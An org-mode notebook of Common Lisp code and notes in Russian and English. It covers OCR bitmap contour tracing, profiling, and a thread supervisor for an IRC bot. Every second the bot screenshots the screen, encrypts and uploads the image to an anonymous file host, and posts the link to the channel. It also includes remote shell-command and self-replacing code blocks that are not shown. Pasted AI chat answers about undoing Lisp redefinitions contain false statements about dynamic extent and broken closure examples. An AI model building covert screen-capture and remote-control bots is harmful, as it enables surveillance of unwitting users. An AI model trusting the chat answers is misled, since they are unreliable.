  ;; (sb-sprof:profile-call-counts "CL-USER")

  (sb-sprof:with-profiling (:max-samples 100
                            :report :flat
                            :mode :time
                            :loop t)
    (copy-png "x-snapshot-true-color.png" "aaaaa.png"))

  ;; (sb-sprof:with-profiling (:max-samples 100
  ;;                           :mode :alloc
  ;;                           :report :flat)
  ;;   (copy-png "x-snapshot-true-color.png" "aaaaa.png"))
#+END_SRC

* TODO Figures

У меня есть некоторая битовая матрица полученная из изображения текста. Там где были буквы - теперь битовые единицы, там где был фон - битовые нули.

Я вижу, что битовые единицы в среднем образуют замкнутые фигуры, вытянутые в горизонтальном направлении. Они похожи на серию кирпичей в стене, как если бы кто-то пытался закрасить только те кирпичи, на которых были написаны слова. Где между слов были пробелы, там кирпичи остались незакрашенными.

Я хочу построить алгоритм, который анализирует эту битовую матрицу и составляет минимальное по размеру описание этих фигур. Этого описания должно быть достаточно, чтобы воспроизвести фигуру по нему.

Если для каждой фигуры передавать только те точки, которые ее ограничивают, тогда по этим точка границ, мы можем позже залить внутренность фигуры и таким образом воссоздать ее.

При сканировании матрицы точек, когда мы встречаем единичный бит, это значит мы обнаружили край фигуры - это начальная точка. Теперь мы можем следовать вдоль ее границы, т.е. выбирать следующую точку так, чтобы нулевой бит был "с той же стороны" что и у предыдущей. У нас не такой большой выбор: по отношению к предыдущей посещенной точке новая точка может быть слева, справа, спереди или (если мы зашли в тупик) сзади. Для этих четырех вариантов нам нужно только два бита на шаг. Алгоритм может предпочитать всегда левый поворот, если он возможен. Тогда слева от текущей точки всегда будут нулевые биты, а справа единичные.

Для выпуклой фигуры мы должны в конце концов дойти до начальной точки и считать, что фигура найдена. Если попытаться ее залить и сравнить с исходной матрицей, то в случае полного совпадения мы имеем выпуклую фигуру и внутри нее нет нулевых точек.

На каждом шаге движения по границе алгоритм может выдавать в выходной поток два бита, которые определяют был ли поворот: "00" для движения в том же направлении, "11" для разворота и шага назад, "10" для поворота и шага налево, "01" для поворота и шага направо. По начальной координате и этому потоку бит можно восстановить всю фигуру.

Так как фигуры в основном выпуклые и вытянутые по горизонтали, чаще всего будет происходить движение прямо и  соответствующая последовательность нулей может быть эффективно сжата впоследствии.

Фигуры почти всегда были бы вытянутыми прямоугольниками, если бы не буквы, написание которых выдается за пределы строки вниз - "q p g", или вверх "d l".

Если две строчки находятся одна под другой и в верхней строчке была буква с нижним подстрочным элементом, такая как "q" а в верхней строчке - с верхним надострочным элементом, такая как "d" - они могли соприкоснуться, и вместо двух раздельных прямоугольников мы получаем одну фигуру из двух прямоугольников но связанных перемычкой (или несколькими). Причем эти перемычки могут быть достаточно толстыми.

Как их можно разделить?

#+BEGIN_SRC lisp
  (defun bitmap-parser (matrix start-point)
    (let ((curr-point start-point)
          (result-string ""))
      ;; Go through each point in the matrix
      (dolist (row matrix)
        (dolist (point row)
          ;; If the current point is 1
          (if (= 1 point)
              (let ((prev-point (previous-point matrix curr-point)))
                ;; Generate a 2-bit string based on the relative positions
                ;; of the current and previous points
                (cond
                  ((= curr-point prev-point)
                   (setf result-string
                         (concatenate 'string result-string "00")))
                  ((adjacent-points-same-direction? curr-point prev-point)
                   (setf result-string
                         (concatenate 'string result-string "10")))
                  (t (setf result-string
                           (concatenate 'string result-string "01"))))
                ;; Check for end of figure
                (when (end-of-figure? matrix curr-point start-point)
                  (return result-string))))
          ;; Set current point to the next one
          (setf curr-point (next-point matrix curr-point))))))

  ;; Helper functions to find the next/previous point and check if two
  ;; points are adjacent in a certain direction
  (defun next-point (matrix coords) ...)
  (defun previous-point (matrix coords) ...)
  (defun adjacent-points-same-direction? (a b) ...)
  (defun end-of-figure? (matrix curr-point start-point) ...)
#+END_SRC

* TODO Ideas

Несколько серверов могут делать лонг-пуллинг для множества клиентов

* TODO TMP

- Получение и обработка изображения
  - Выделение строк в тексте
  - Деление блока по вертикальным белым просветам
    - Вертикальная проекция - просто посмотреть сколько белых пикселей в каждой строчке и найти белые просветы в этих проекциях; все что находится между этими белыми просветами - это строчки
    - Горизонтальная проекция сегментирует слова (широкие просветы) и символы (узкие просветы)
    - OverSegmetation - строим структуру "граф линейного деления" - набор гипотез где могут быть отдельные символы - для каждого ребра этого графа нужно произвести символьное распознавание, в итоговом графе найти наилучший путь, опираясь на результаты распознавание отдельных символов и какую-то контекстную информацию.
    - Выбор в пайплайне - задача для обучения с подкреплением.
- Анализ структуры страницы
- Распознавание текста
- Синтез документа из распознаных фрагментов
- Сохранение в нужном формате

Структура сети (LSTM):
- Сверточный блок (CNN) - извлекает последовательность визуальных признаков
- Рекуррентный блок  (RNN) - делает предсказания символов

SegLink - Segmens and Link:
- Сегменты - это квадратные участки изображения
- Те сегменты что лежат внутри одного бокса (они в одном слове) мы соединяем линками - это ребро графа
- Сеть предсказывает эти сегменты и линки.
- Работать на нескольких масштабах - 64*64, 32*32, тогда добавляются линки между сегментами разных масштабов
- Кластеризация segments через links с помощью нахождения компонентов связности через dfs
- Segments из одного кластера используют для построения итогового bbox-a

Восстановление ошибок распознавание по словарю

Извлечение смысла с chatGPT и классификаторами

#+NAME: min
#+BEGIN_SRC lisp :tangle ./src/tmp.lisp :noweb yes :exports code
  <<min>>

  <<queue>>

  <<task>>

  <<x_snapshot>>

  ;; (x-snapshot :path "x-snapshot-true-color.png")
#+END_SRC

* TODO Terminating lazy threads

The second thing suspicious to ~PHOENIX~ is when the thread under investigation does not do its job. There may be one or more incoming queues associated with each thread. If there are too many messages piled up in the inbox, this is a reason to kill:

#+NAME: rule_of_killing_threads_by_queue_overflow
#+BEGIN_SRC lisp
  (alexandria:named-lambda rule-of-killing-threads-by-queue-overflow ()
    (let ((thread-structs (get-all-threads)))
      (loop for suspicious in thread-structs :do
        (let ((max-queue-size 30))
          (if (< max-queue-size (thread-queue-size suspicious))
              (kill-thread suspicious))))))
#+END_SRC

There can be many more such rules. Not all of them are born to kill. For example, this rule will create a thread named "irc-conn" if no such thread already exists:

#+NAME: rule_of_born_irc_conn_threads
#+BEGIN_SRC lisp
  (alexandria:named-lambda rule-of-born-irc-conn-threads ()
    (let ((thread-structs (get-all-threads)))
      (lambda (thread-structs)
        (let ((irc-conn-thread (find-thread "irc-conn")))
          (make-irc-conn-thread)))))
#+END_SRC

Now that we have the rules, it is enough to call them one after another. Just for convenience, I moved outside the auxiliary functions that the rules need:

#+NAME: phoenix_processor_of_rules
#+BEGIN_SRC lisp :noweb yes :exports code
  (labels ((get-all-threads ()
             nil)
           (how-many-times-have-i-seen-you ()
             nil)
           (kill-thread ()
             nil)
           (thread-queue-size ()
             nil)
           (find-thread (name)
             nil)
           (make-irc-conn-thread ()
             nil))
    (let ((rules
            (list
             <<rule_of_killing_threads_by_time>>
             <<rule_of_killing_threads_by_queue_overflow>>
             <<rule_of_born_irc_conn_threads>>)))
      (loop for rule in rules do
        (funcall rule))))
#+END_SRC

To avoid race conditions, it is necessary to use thread-operations-lock


#+NAME: phoenix
#+BEGIN_SRC lisp :tangle ./src/max.lisp :noweb yes :exports code
  (defparameter *thread-operations-lock*
    (bt:make-recursive-lock "thread-operations-lock"))

  (defparameter *phoenix*
    (lambda ()
      <<phoenix_processor_of_rules>>
      ))
#+END_SRC

The rest of the logic of the work will be encapsulated in the correct order of rules. We will consider it in the next sections, but for now we will limit ourselves to the diagram:




[TODO:gmm] -=HERE=- ----------------------------------------


Мы хотим создать надежную систему, но подключение к интернету может быть ненадежным, к тому же нет уверенности в том, что все ошибки, которые могут возникнуть, будут корректно перехвачены.

Поэтому мы сделаем супервизор, который будет перезапускать потоки, в которых будет происходить основная работа. Если у потока возникнут проблемы - супервизор отследит это и перезапустит поток.

Чтобы иметь возможность изменять супервизор на лету, мы оформим его как лямбду в глобальной переменной, которую будет вызывать функция ~supervisor-loop~.

Мы также используем флаги, размещенные в глобальных переменных, чтобы супервизор мог принудительно завершать потоки. Если что-то пойдет не так то поток может, например, перезапустить себя, выставив нужный флаг.

Каждую секунду супервизор инкрементирует состояние переменной ~watchdog-timer~. Если поток завис и не сбрасывает эту переменную в ноль - супервизор принудительно завершает поток, что приводит к его перезапуску.

Если соединение с irc-сервером установлено (о чем свидетельствует ~connection-established-flag~) то супервизор должен запускать новый поток репортинга каждую секунду. Задача этого потока - сделать скриншот экрана, поместить в png-файл, зашифровать его, загрузить на файлообменник и послать полученную ссылку в чат. После выполнения задачи поток должен завершиться. Это не обязательно произойдет - он может зависнуть из-за ошибки или просто слишком долго работать. Поэтому супервизор отслеживает количество таких потоков и если их становится больше чем ~max-shot-thread-cnt~ удаляет те, которые работают слишком долго.

[TODO:gmm] Возможно, эта модель не требуется, т.к. нам не нужно создавать по отдельному потоку для скриншотинга каждую секунду. Т.е. мы вполне можем обойтись только контролем зависания одного потока, в котором работает цикл приема сообщений.

#+NAME: supervisor
#+BEGIN_SRC lisp :noweb yes :exports none
  <<debug>>

  (defparameter *max-diffs-cnt* 4)

  (defparameter *sleep-interval* 3)

  (defparameter *watchdog-timer* 0)

  (defparameter *watchdog-timer-max* 100)

  (defparameter *supervisor-stop-flag* nil)

  (defparameter *irc-th-stop-flag* nil)

  (defparameter *shot-th-stop-flag* nil)

  (defparameter *connection-established-flag* nil)

  (defparameter *shot-threads* nil)

  (defparameter *max-shot-thread-life-time* 5)

  (defparameter *max-shot-thread-cnt* 5)

  (defparameter *thread-operations-lock*
    (bt:make-recursive-lock "thread-operations-lock"))

  ;; irc
  <<irc>>

  ;; update
  <<update>>

  ;; shot
  <<shot>>

  ;; upload_code
  <<upload_code>>

  ;; replace_yourself
  <<replace_yourself>>

  ;; remote_gui
  <<remote_gui>>

  ;; shell_command
  <<shell_command>>

  (defparameter *supervisor*
    (lambda ()
      (let ((all-threads (mapcar #'(lambda (th)  (cons (bt:thread-name th) th))
                                 (bt:all-threads))))
        (labels ((fnd (name) (loop :for (nm . th) :in all-threads
                                :do (when (equal name nm)  (return th))))
                 (kill (th)  (handler-case (bt:destroy-thread th)
                               ;; happens, when thread destroyed already
                               (TYPE-ERROR () nil)))
                 (kill-irc (th)
                   (kill th)
                   (setf *watchdog-timer* 0)
                   (setf *connection-established-flag* nil))
                 (clear ()
                   (bt:with-recursive-lock-held (*thread-operations-lock*)
                     (setf *shot-threads*
                           (remove-if-not #'(lambda (pair)
                                              (bt:thread-alive-p (car pair)))
                                          ,*shot-threads*)))))
          ;; if there is no irs-thread then start it
          (when (and (null (fnd "irc-th"))       ;; no irc-th
                     (null *irc-th-stop-flag*))  ;; no irc-th stop flag
            (dbg "::supervisor lambda: start irc-th~%")
            (setf *watchdog-timer* 0)
            (bt:make-thread
             #'irc :name "irc-th"
             :initial-bindings
             `((*standard-output* . ,*standard-output*)
               (*irc-thread-stop-flag* . ,*irc-th-stop-flag*))))
          ;; if there is irc-thread, but the watchdog-timer exceeds
          ;; or the flag is set - then kill it.
          (awhen (fnd "irc-th")
            (when (> *watchdog-timer*  *watchdog-timer-max*)
              (dbg "::supervisor-lambda: kill irc-th by WDG~%")
              (kill-irc it))
            (when *irc-th-stop-flag*
              (dbg "::supervisor-lambda: kill irc-th by FLAG~%")
              (kill-irc it)))
          ;; kill latecomers shot-threads if there are too many
          ;; TODO: debug it!
          (when (> (length *shot-threads*) *max-shot-thread-cnt*)
            (dbg "::supervisor-lambda: many threads~%")
            (loop :for (shot-th . time) :in *shot-threads* :do
                 (dbg "~A . ~A~%" shot-th time)
                 (when (> (- (get-universal-time) time)
                          ,*max-shot-thread-life-time*)
                   (dbg "::supervisor-lambda: kill shot-th by lifetime exceed~%")
                   (kill shot-th)))
            (clear))
          ;; start new shot-thread (every second when connection-established)
          (clear)
          (when *connection-established-flag*
            (let ((bindings `((*standard-output* . ,*standard-output*)
                              (*shot-th-stop-flag* . ,*shot-th-stop-flag*)
                              (*irc-sess* . ,*irc-sess*)
                              (*irc-user* . ,*irc-user*)
                              (*irc-serv* . ,*irc-serv*)
                              (*irc-chan* . ,*irc-chan*)
                              (*irc-lock* . ,*irc-lock*)
                              (*irc-conn* . ,*irc-conn*)
                              (*watchdog-timer* . ,*watchdog-timer*))))
              (bt:with-recursive-lock-held (*thread-operations-lock*)
                (push (cons (bt:make-thread #'shot :name "shot-th"
                                            :initial-bindings bindings)
                            (get-universal-time))
                      ,*shot-threads*))))))))

  (defun supervisor-loop ()
    (setf *watchdog-timer* 0)
    (tagbody
     infinite
       (when *supervisor-stop-flag*
         (go end))
       (dbg "::supervisor-loop WDG=~3,'0D~%" *watchdog-timer*)
       (funcall *supervisor*)
       (sleep *sleep-interval*)
       (incf *watchdog-timer*)
       (go infinite)
     end))

  (supervisor-loop)
#+END_SRC

Ниже - диаграмма работы супервизора с остальными компонентами

#+BEGIN_SRC plantuml :file ./img/survey-01.png
  participant Supervisor
  participant Shot_Thread
  participant Irc_Thread
  participant Irc_Helper
  participant Irc_Server
  hide footbox
  create Irc_Thread
  Supervisor -> Irc_Thread : make_thread
  Supervisor -> Supervisor : wait for **CONNECTION_ESTABLISHED_FLAG**
  Irc_Thread -> Irc_Server : connect
  Irc_Server -> Irc_Thread : ok

  group Irc_Loop
    create Irc_Helper
    Irc_Thread   -> Irc_Helper : make_thread
    Irc_Thread -> Irc_Thread : read_message_loop
    activate Irc_Helper
    note right Irc_Helper
      add_hook **IRC_MSG_HOOK**
      join to channel
      send presence
      set **CONNECTION_ESTABLISHED_FLAG**
    end note
    Irc_Helper --> Irc_Helper :
    destroy Irc_Helper
	end

  Irc_Thread --> Irc_Thread : IRC_MSG_HOOK
  Irc_Thread --> Irc_Thread : IRC_MSG_HOOK
  Irc_Thread --> Irc_Thread : IRC_MSG_HOOK

  group When **CONNECTION_ESTABLISHED_FLAG**
    create Shot_Thread
    Supervisor -> Shot_Thread : make_thread
    activate Shot_Thread

    note over Shot_Thread
      x_snapshot
      pack_img
    end note

    group Wrap_Img
      note over Shot_Thread
        encrypt
        anon-file-upload
        sendmsg
      end note
    end

    Shot_Thread --> Shot_Thread :
    destroy Shot_Thread
	end
#+END_SRC

#+results:
[[file:./img/survey-01.png]]

[[file:./img/survey-01.png]]

* With-undo

Когда я использую Lisp и REPL я могу переопределить функцию, которая уже была ранее определена. При этом я могу внести некоторые ошибки, которые сначала не проявляются, но могут вызвать condition спустя некоторое время. Как мне разработать механизм, который в случае неожиданной ошибки отменит мои изменения вернув переопределенную мной функцию к исходному состоянию до переопределения?

Вы можете использовать механизм, называемый "обратное отменение" (undo), чтобы откатить изменения, которые вы внесли в REPL. Для этого вам нужно сохранить исходное определение функции в переменной перед тем, как переопределить ее в REPL. Затем, если в процессе работы вы обнаружите неожиданную ошибку, вы можете просто восстановить исходное определение функции из сохраненной переменной.

Вот пример, как это можно сделать в Lisp:

#+BEGIN_SRC lisp
  ;; Сохраняем исходное определение функции в переменной
  (defvar original-function (symbol-function 'my-function))

  ;; Переопределяем функцию
  (defun my-function (x y)
    (+ x y))

  ;; ...здесь вы можете использовать переопределенную функцию...

  ;; Если вы обнаружили ошибку, восстанавливаем исходное определение функции
  (setf (symbol-function 'my-function) original-function)
#+END_SRC

В этом примере мы сначала сохраняем исходное определение функции my-function в переменной original-function. Затем мы переопределяем функцию my-function, используя новую реализацию. В процессе работы вы можете вызвать my-function много раз, но если вам потребуется откатить изменения, вы можете просто использовать setf для восстановления исходного определения функции из переменной original-function.

Обратите внимание, что это решение может быть неэффективным, если вы переопределяете множество функций в REPL, поскольку вам придется сохранять исходные определения для каждой функции. В таком случае вам может потребоваться более сложный механизм для отмены изменений, например, подключение к истории команд или использование отдельного буфера REPL для временных изменений.
Rigidus Rigidus
Как мне сделать этот механизм более системным (на уровне системы). Я бы хотел, чтобы любое переопределение функции, любое изменение переменной приводило к тому, что записывалось бы текущее состояние до изменения. Таким образом, чтобы к этому состоянию можно было вернуться

Для создания системного механизма для отката изменений вам потребуется более сложный подход, например, реализация системы контроля версий.

Вы можете использовать готовые системы контроля версий, такие как Git, для отслеживания изменений в вашем коде. Для этого вам нужно будет создать репозиторий Git для вашего проекта и регулярно фиксировать изменения с помощью команды git commit. Эта команда создает новый коммит, который содержит текущее состояние вашего кода. Вы можете использовать команду git checkout для перехода к любому коммиту в истории изменений.

Если вам нужно отслеживать изменения в реальном времени, вы можете использовать инструменты, такие как GNU Debugger (GDB), которые позволяют вам отслеживать состояние программы во время ее выполнения и сохранять историю состояний. GDB также позволяет отменять изменения, которые были внесены во время выполнения программы.

Если вы хотите реализовать свой собственный механизм контроля версий на уровне языка, вам потребуется создать свой собственный механизм записи истории изменений и отката. Это может быть достигнуто путем использования макросов Lisp, которые могут перехватывать и записывать изменения в функциях и переменных.

Например, вы можете создать макрос with-undo, который автоматически сохраняет текущее состояние функции или переменной и предоставляет интерфейс для возврата к предыдущим состояниям. Затем вы можете обернуть любой код, который вносит изменения в функции или переменные, в этот макрос, чтобы автоматически сохранять историю изменений.

Вот пример, как это можно сделать в Lisp:

#+BEGIN_SRC lisp
  (defmacro with-undo ((&rest bindings) &body body)
    "Provides a mechanism for undoing changes to variables and functions."
    `(let ,(loop for (var val) in bindings collect `(,var ,val))
       (unwind-protect
           (progn ,@body)
         ,@(loop for (var val) in bindings collect
                  `(setf ,var ,val)))))

  ;; Использование макроса
  (with-undo ((original-fn (symbol-function 'my-function)))
    (defun my-function (x y)
      (+ x y)))

  ;; ...ваш код...

  ;; Если вы обнаружили ошибку, восстанавливаем исходное определение функции
  (with-undo ((original-fn (symbol-function 'my-function)))
    (setf (symbol-function 'my-function) original-fn))

#+END_SRC

Этот пример показывает, как можно использовать макрос `with-undo

Концепция, которую я описал, заключается в создании макроса with-undo, который предоставляет механизм для сохранения истории изменений в функциях и переменных и возврата к предыдущим состояниям.

Рассмотрим эту идею более подробно:

    Определение макроса with-undo

Макрос with-undo определен с помощью ключевых слов defmacro, которое позволяет создавать новые формы языка Lisp. Макрос принимает два аргумента: список привязок bindings, содержащий исходные значения переменных или функций, и форму body, которая содержит код, который может вносить изменения в переменные или функции.

    Сохранение текущих значений переменных и функций

Перед выполнением body макрос with-undo сохраняет текущие значения переменных и функций, указанных в bindings, используя форму (let ((var val) ...)). Значения переменных и функций сохраняются в локальные переменные макроса, которые будут использоваться для восстановления значений при возврате к предыдущему состоянию.

    Выполнение кода

Затем with-undo выполняет форму body, которая может вносить изменения в переменные и функции.

    Обработка ошибок

Если происходит ошибка, например, вызывается условие error, with-undo перехватывает ошибку, используя форму unwind-protect. Это гарантирует, что сохраненные значения переменных и функций будут восстановлены, даже если происходит ошибка.

    Восстановление предыдущих значений

После выполнения body макрос with-undo восстанавливает исходные значения переменных и функций, используя форму (setf var val). Это возвращает переменные и функции к их предыдущим состояниям.

    Использование макроса

Вы можете использовать макрос with-undo для изменения функций и переменных в вашем коде, предоставляя механизм отката изменений в случае ошибок. Например, если вы хотите изменить функцию my-function, вы можете использовать макрос with-undo, чтобы сохранить исходное определение функции, затем определить новую версию функции внутри with-undo, и если происходит ошибка, восстановить исходное определение функции.

vbnet

;; Сохраняем исходное определение функции
(with-undo ((original-fn (symbol-function 'my-function)))
  ;; Определяем новую версию функции
  (defun my-function (x y)
    (+ x y)))

;; ...ваш код...

Как в лиспе происходит переопределение функции в REPL. Имя функции - это символ с которым связан скомпилированный код и когда я переопределяю функцию я перезаписываю этот код? Или существует иной механизм?

Что происходит когда есть некоторый выполняющийся код, который вызывает переопределяемую функцию. Если я переопределил функцию, выполняющийся код будет продолжать вызывать старый вариант переопределяемой функции или новый?

В Лиспе переопределение функции в REPL происходит очень просто. Имя функции - это символ, и когда вы переопределяете функцию, вы связываете этот символ с новым кодом. При этом все ссылки на этот символ будут использовать новый код, включая выполняющийся код.

Когда есть выполняющийся код, который вызывает переопределяемую функцию, то после переопределения функции, выполнение кода будет использовать новый вариант функции, а не старый. Это происходит потому, что в Лиспе функции являются объектами первого класса, и все ссылки на функцию являются ссылками на этот объект, а не на конкретный кусок кода. Поэтому переопределение функции заменяет объект функции на новый объект, и все ссылки на этот объект будут использовать новую реализацию.
Rigidus Rigidus
Таким образом можно ли сказать связь символа функции и ее кода имеет dynamic-extent?

Да, в Лиспе связь между символом функции и её кодом имеет динамический экстент (dynamic extent). Dynamic extent — это временной интервал, в течение которого объект существует в памяти.

В данном случае, при создании функции в Лиспе, код функции связывается с символом функции и существует в памяти в течение времени жизни программы. Когда функция переопределяется, новый код связывается с символом функции, а старый код может быть удалён из памяти, если на него больше нет ссылок. Таким образом, связь символа функции и её кода имеет динамический экстент, который определяется временем жизни программы и временем жизни ссылок на объекты функций.
Rigidus Rigidus
Как может так получиться что на старый код есть ссылки и он не будет удален из памяти?

В Лиспе все объекты управляются сборщиком мусора (garbage collector), который следит за тем, чтобы объекты удалялись из памяти, когда на них больше нет ссылок. Однако, в случае с переопределением функции, может произойти так, что старый код функции останется в памяти, даже если на него больше нет явных ссылок.

Это может произойти, например, если была создана замыкание, которое ссылается на старый код функции. В этом случае, замыкание будет хранить ссылку на объект функции, который был создан ранее, и этот объект не будет удален из памяти, даже если символ функции был переопределен.

Ещё одна причина, по которой старый код функции может оставаться в памяти, — это использование компиляции функций во время выполнения программы. В этом случае, старый скомпилированный код может остаться в памяти, даже если символ функции был переопределен. Однако, в большинстве реализаций Лиспа, при переопределении функции скомпилированный код также перекомпилируется, поэтому этот случай не так распространен.

Таким образом, старый код функции может остаться в памяти, даже если символ функции был переопределен, но это происходит редко и обычно не приводит к серьезным проблемам с производительностью или утечкой памяти.
Rigidus Rigidus
Приведи пример кода, где замыкание хранит ссылку на объект функции препятствуя удалению этого обьекта при переопределении

Конечно, вот пример кода, который демонстрирует, как замыкание может сохранить ссылку на объект функции и препятствовать удалению этого объекта при переопределении символа функции:

lisp

;; Создаем функцию adder, которая создает и возвращает замыкание, которое
;; сохраняет ссылку на саму себя в переменной fn
(defun adder (n)
  (let ((sum n))
    (lambda (x)
      (setq sum (+ sum x))
      (format t "Sum is ~a~%" sum)
      fn)))

;; Создаем замыкание, сохраняющее ссылку на функцию adder
(setq fn (adder 0))

;; Вызываем замыкание несколько раз
(funcall fn 1)
(funcall fn 2)
(funcall fn 3)

;; Переопределяем символ adder новой функцией
(defun adder (n)
  (let ((sum n))
    (lambda (x)
      (setq sum (+ sum x))
      (format t "New sum is ~a~%" sum)
      fn)))

;; Вызываем замыкание снова
(funcall fn 4)

В этом коде функция adder создает замыкание, которое сохраняет ссылку на само себя в переменной fn. После этого мы вызываем замыкание несколько раз, и оно выводит в консоль текущее значение суммы.

Затем мы переопределяем символ adder новой функцией, но замыкание, которое мы создали ранее, все еще ссылается на старую функцию, и выводит в консоль старое значение суммы. Это происходит потому, что замыкание сохраняет ссылку на объект функции, который был создан ранее, и этот объект не будет удален из памяти, даже если символ функции был переопределен.

Вопрос:

Представим себе что каждое новое переопределение функции - это на самом деле замыкание, которое ссылается на старое определение функции. Можно ли сказать что у нас появляется граф переопределений функций? Можем ли мы использовать этот граф для того чтобы реализовать многоуровневую отмену переопредений или даже отмену с ветвлением?

Да, если каждое новое переопределение функции создает новое замыкание, которое ссылается на старое определение функции, то мы можем представить переопределения функций в виде графа, где каждый узел представляет определение функции, а ребра представляют ссылки на старые определения функции.

Этот граф можно использовать для реализации многоуровневой отмены переопределений. Если мы хотим отменить переопределение функции, мы можем просто удалить соответствующий узел из графа. Если на удаляемый узел ссылаются другие определения функций, то мы можем перенаправить ссылки на следующее определение функции в графе.

Отмена с ветвлением, когда мы хотим отменить несколько переопределений функций одновременно, может быть реализована с использованием ветвей в графе. Мы можем создать новую ветвь для каждого переопределения функции, которое мы хотим отменить, и перенаправить ссылки на соответствующие узлы в каждой ветви.

Однако стоит отметить, что такой подход может привести к сложности в управлении памятью, так как каждое переопределение функции создает новое замыкание и сохраняет ссылки на предыдущие версии функции. Это может привести к накоплению большого количества объектов в памяти, которые могут оказаться ненужными после отмены переопределений.

Приведи пример кода, который иллюстрирует это

#+BEGIN_SRC python
  def multiply(x):
      def inner(y):
          return x * y
      return inner

  double = multiply(2)
  triple = multiply(3)

  print(double(5))  # Output: 10
  print(triple(5))  # Output: 15

  multiply = None
  print(double(5))  # Output: 10
  print(triple(5))  # Output: 15
#+END_SRC
В этом примере функция multiply возвращает вложенную функцию inner, которая умножает свой аргумент на значение x, которое передается при вызове multiply.

Мы создаем две новые функции double и triple, используя multiply для установки значения x. После этого мы удаляем переменную multiply, чтобы переопределить функцию multiply и назначить ей значение None.

Однако, как мы видим, это не приводит к тому, что double и triple будут удалены из памяти. Это происходит потому, что каждое замыкание, созданное при вызове multiply, хранит ссылку на свою собственную версию функции multiply. Это означает, что double и triple продолжат ссылаться на старое определение multiply, несмотря на то, что мы удалили и переопределили эту функцию.

Таким образом, мы можем сказать, что замыкание в Python хранит ссылки на объекты, которые используются при его создании, и что это может привести к тому, что объекты остаются в памяти даже после того, как они становятся недостижимыми.

? Можешь ли ты переписать этот пример на Lisp?

#+BEGIN_SRC lisp

  (defun multiply (x)
    (lambda (y) (* x y)))

  (defvar double (multiply 2))
  (defvar triple (multiply 3))

  (print (funcall double 5))  ; Output: 10
  (print (funcall triple 5))  ; Output: 15

  (setq multiply nil)
  (print (funcall double 5))  ; Output: 10
  (print (funcall triple 5))  ; Output: 15
#+END_SRC

Здесь функция multiply возвращает замыкание, которое умножает свой аргумент на значение x. Мы создаем две новые функции double и triple, используя multiply для установки значения x. После этого мы переопределяем multiply, назначив ей значение nil.

Но как и в примере на Python, замыкания double и triple по-прежнему ссылается на старую версию функции multiply, и поэтому они продолжают работать корректно, несмотря на то, что мы переопределили функцию multiply.

Таким образом, пример на Lisp демонстрирует то же самое поведение, что и пример на Python - замыкания могут сохранять ссылки на объекты, которые использовались при их создании, и это может привести к тому, что объекты остаются в памяти, даже если они становятся недостижимыми.

Rigidus Rigidus
Как в лиспе происходит переопределение функции в REPL. Имя функции - это символ с которым связан скомпилированный код и когда я переопределяю функцию я перезаписываю этот код? Или существует иной механизм?

Что происходит когда есть некоторый выполняющийся код, который вызывает переопределяемую функцию. Если я переопределил функцию, выполняющийся код будет продолжать вызывать старый вариант переопределяемой функции или новый?

В Лиспе переопределение функции в REPL происходит очень просто. Имя функции - это символ, и когда вы переопределяете функцию, вы связываете этот символ с новым кодом. При этом все ссылки на этот символ будут использовать новый код, включая выполняющийся код.

Когда есть выполняющийся код, который вызывает переопределяемую функцию, то после переопределения функции, выполнение кода будет использовать новый вариант функции, а не старый. Это происходит потому, что в Лиспе функции являются объектами первого класса, и все ссылки на функцию являются ссылками на этот объект, а не на конкретный кусок кода. Поэтому переопределение функции заменяет объект функции на новый объект, и все ссылки на этот объект будут использовать новую реализацию.
Rigidus Rigidus
Таким образом можно ли сказать связь символа функции и ее кода имеет dynamic-extent?

Да, в Лиспе связь между символом функции и её кодом имеет динамический экстент (dynamic extent). Dynamic extent — это временной интервал, в течение которого объект существует в памяти.

В данном случае, при создании функции в Лиспе, код функции связывается с символом функции и существует в памяти в течение времени жизни программы. Когда функция переопределяется, новый код связывается с символом функции, а старый код может быть удалён из памяти, если на него больше нет ссылок. Таким образом, связь символа функции и её кода имеет динамический экстент, который определяется временем жизни программы и временем жизни ссылок на объекты функций.
Rigidus Rigidus
Как может так получиться что на старый код есть ссылки и он не будет удален из памяти?

В Лиспе все объекты управляются сборщиком мусора (garbage collector), который следит за тем, чтобы объекты удалялись из памяти, когда на них больше нет ссылок. Однако, в случае с переопределением функции, может произойти так, что старый код функции останется в памяти, даже если на него больше нет явных ссылок.

Это может произойти, например, если была создана замыкание, которое ссылается на старый код функции. В этом случае, замыкание будет хранить ссылку на объект функции, который был создан ранее, и этот объект не будет удален из памяти, даже если символ функции был переопределен.

Ещё одна причина, по которой старый код функции может оставаться в памяти, — это использование компиляции функций во время выполнения программы. В этом случае, старый скомпилированный код может остаться в памяти, даже если символ функции был переопределен. Однако, в большинстве реализаций Лиспа, при переопределении функции скомпилированный код также перекомпилируется, поэтому этот случай не так распространен.

Таким образом, старый код функции может остаться в памяти, даже если символ функции был переопределен, но это происходит редко и обычно не приводит к серьезным проблемам с производительностью или утечкой памяти.
Rigidus Rigidus
Приведи пример кода, где замыкание хранит ссылку на объект функции препятствуя удалению этого обьекта при переопределении

Конечно, вот пример кода, который демонстрирует, как замыкание может сохранить ссылку на объект функции и препятствовать удалению этого объекта при переопределении символа функции:

lisp
;; Создаем функцию adder, которая создает и возвращает замыкание, которое
;; сохраняет ссылку на саму себя в переменной fn
(defun adder (n)
  (let ((sum n))
    (lambda (x)
      (setq sum (+ sum x))
      (format t "Sum is ~a~%" sum)
      fn)))

;; Создаем замыкание, сохраняющее ссылку на функцию adder
(setq fn (adder 0))

;; Вызываем замыкание несколько раз
(funcall fn 1)
(funcall fn 2)
(funcall fn 3)

;; Переопределяем символ adder новой функцией
(defun adder (n)
  (let ((sum n))
    (lambda (x)
      (setq sum (+ sum x))
      (format t "New sum is ~a~%" sum)
      fn)))

;; Вызываем замыкание снова
(funcall fn 4)

В этом коде функция adder создает замыкание, которое сохраняет ссылку на само себя в переменной fn. После этого мы вызываем замыкание несколько раз, и оно выводит в консоль текущее значение суммы.

Затем мы переопределяем символ adder новой функцией, но замыкание, которое мы создали ранее, все еще ссылается на старую функцию, и выводит в консоль старое значение суммы. Это происходит потому, что замыкание сохраняет ссылку на объект функции, который был создан ранее, и этот объект не будет удален из памяти, даже если символ функции был переопределен.
Rigidus Rigidus
Представим себе что каждое новое переопределение функции - это на самом деле замыкание, которое ссылается на старое определение функции. Можно ли сказать что у нас появляется граф переопределений функций? Можем ли мы использовать этот граф для того чтобы реализовать многоуровневую отмену переопредений или даже отмену с ветвлением?

Да, если каждое новое переопределение функции создает новое замыкание, которое ссылается на старое определение функции, то мы можем представить переопределения функций в виде графа, где каждый узел представляет определение функции, а ребра представляют ссылки на старые определения функции.

